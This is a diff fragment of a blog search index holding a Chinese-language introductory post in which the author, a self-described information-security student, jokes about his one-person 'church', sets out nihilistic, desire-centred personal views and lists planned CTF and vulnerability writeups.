+        <content type="html"><![CDATA[<h1 id="你好👋"><a href="#你好👋" class="headerlink" title="你好👋"></a>你好👋</h1><p><img src="/2023/10/21/old/hello-and-call-me-lord/%E8%BF%9C%E8%A7%86%E4%B8%BB%E4%B9%89%E6%97%97%E5%B8%9C.jpeg"></p><h2 id="关于我的名字和这个教会"><a href="#关于我的名字和这个教会" class="headerlink" title="关于我的名字和这个教会"></a>关于我的名字和这个教会</h2><p>我是truthleader，也可以叫我真理教教主</p><span id="more"></span><p>我本来给自己设计的网名就是真理教教主，但是truthleader听上去更朗朗上口</p><p>所以我用google翻译得到了truthleader，（很遗憾现在不是这样的翻法了）😭</p><p>这是一个教会的官方网站，但是注意，这是一个私人的教会，我的意识是教会成员只有一个人，我兼任教主、圣战委员会常务委员长、自我教育局局长······</p><p>总之，这个网站代表着我想要公之于众的自我内心世界，我的初心就是把我最真实的精神世界裸露出来，不论祂是否让人感到愉悦好玩、恶心厌恶————I don’t care a fuck</p><h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p>我学习的专业是信息安全，我将此看作我主要的经济来源，这是我的爱好</p><p>我喜欢学习：哲学的、社会学的、科学的、政治的、心理的、生物的、医学的、地理的、计算机或者安全相关的——一切都是我想学的</p><p>我希望别人对我的评价是：thinker</p><h3 id="我的观念"><a href="#我的观念" class="headerlink" title="我的观念"></a>我的观念</h3><p>我将虚无主义预设为前提：</p><ol><li>目的本身是没目的的</li><li>意义本身是没意义的</li><li>存在是虚无的，但其存在是一个奇迹</li><li>伦理道德是空虚之物</li><li>不能用虚无为自己消极的态度做辩护，两者根本不接轨，想自杀的人因此而无顾忌，乐观向上的人因此而无拘束的乐于助人追求进步</li><li>自杀是不对的，死亡是不对的，人的欲望不应把人摧毁，我的欲望不应把我摧毁，</li></ol><ul><li><p>所谓的“我”是头脑生出的幻想，我所认为的那个“我”并不存在，本真的“我”是虚无的，所谓的自我意识是欲望集合体的某一个组织——调配欲望的优先满足顺序、计划欲望满足的机器</p></li><li><p>我把“求知欲”认定为我，我将禁欲的欲望当作枪来压制游戏的欲望和性的欲望，一切互相制衡分出高低，我把自己看作一个欲望代言人，欲望都想当我</p></li><li><p>求知欲是唯一变革自我观念、自我能力、自我的动力，我因此而行动生活，我不认为我的观念是真的、有价值的、可信的</p></li><li><p>我因为学习和头脑训练得出观念，我视其为求知欲想认识自己</p></li><li><p>我将欲望看作是第一性的，因而以此为基础来看待世界</p></li><li><p>对我来说，欲望的对象是具体的人和事，但欲望的目的是自我再生产，欲望通过快感实现再生产</p></li><li><p>快感是让人有愧疚感、罪恶感、兴奋感的上瘾之物</p></li><li><p>欲望的停止就是世界的死去</p></li><li><p>一切都是欲望的产物，包括欲望，例如：时间在前进、世界在涌现、现在带着过去奔向未来、有着“定律”的未来在把现实和过去牵引、资本为了再生产而支取肉身、变革者为了福祉、平等、幸福、理想而不断的前进、福祉本身的标准越来越高、科学越来越复杂强大、抖音越刷越想刷、游戏越玩越想玩</p></li><li><p>人不应该在欲望上让步，要不顾一切的让自己的欲望不断的再生产——保持生存、避免危险、享用美食、求取知识、爱另一半、尊老爱幼、尊敬师长、服从规矩</p></li><li><p>但欲望之间是互相冲突的，例如：想吃饭同时又想五谷轮回，总要先五谷轮回才能吃好饭，你是否想在五谷轮回的时候吃饭呢？有了一门赚钱的方式，但这触碰了良心，只有先检查良心去伪存真，然后才知道到底要不要这么做？</p></li><li><p>我只捍卫自己的欲望，别人怎么样与我无关，除非有欲望的牵扯，除非长远来看我真的确实就应该服软</p></li><li><p>罪犯有犯罪的能力，共同体的代表有抓捕的权利和义务</p></li></ul><h1 id="关于这个网站和未来的展望"><a href="#关于这个网站和未来的展望" class="headerlink" title="关于这个网站和未来的展望"></a>关于这个网站和未来的展望</h1><h2 id="我必须承认，我什么都没准备好："><a href="#我必须承认，我什么都没准备好：" class="headerlink" title="我必须承认，我什么都没准备好："></a>我必须承认，我什么都没准备好：</h2><ol><li>我没有关于这个网站的一个准确的定位，我不知道这个博客到底有什么价值——能让我使用时间去构筑和维护</li><li>我没有设计这个网站的标签系统和分类系统，我想在博文的数量多一点之后再分类和贴标签</li><li>我认为这个网站的美术和外观都是一坨💩，这个网站堪堪一用就被我上传上来了（说不定以后会改善，我可能会钻研css和js，我也可能会在github上找我喜欢的代码用到这里来）</li></ol><h2 id="同时我也要对自己争辩，这个网站还是很不错的："><a href="#同时我也要对自己争辩，这个网站还是很不错的：" class="headerlink" title="同时我也要对自己争辩，这个网站还是很不错的："></a>同时我也要对自己争辩，这个网站还是很不错的：</h2><ol><li>我能通过这个来展示自己的能力，以后甚至可以写简介里</li><li>我可以通过这个网站来吸引一些同好来交流，我将因此而得到提升</li><li>我将通过对这个网站灌注心血来反向提升自我</li></ol><h2 id="然后，你可能会好奇，我会写些什么："><a href="#然后，你可能会好奇，我会写些什么：" class="headerlink" title="然后，你可能会好奇，我会写些什么："></a>然后，你可能会好奇，我会写些什么：</h2><ol><li>CTF题目的writeup</li><li>靶机的writeup</li><li>漏洞的技术文档或学习笔记</li><li>对安全事件的技术性反思</li><li>对我的观念的阐述</li><li>网安甚至其他内容的学习笔记</li><li>读书笔记</li></ol><h2 id="我希望这个网站："><a href="#我希望这个网站：" class="headerlink" title="我希望这个网站："></a>我希望这个网站：</h2><ol><li>能越来越有名气</li><li>外观和美术越来越好看</li><li>每个人能从中获益，从而找到好友</li><li>能给我的就业和真实生活带了进步</li><li>有一个完善的标签和分类体系</li></ol>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
 </search>
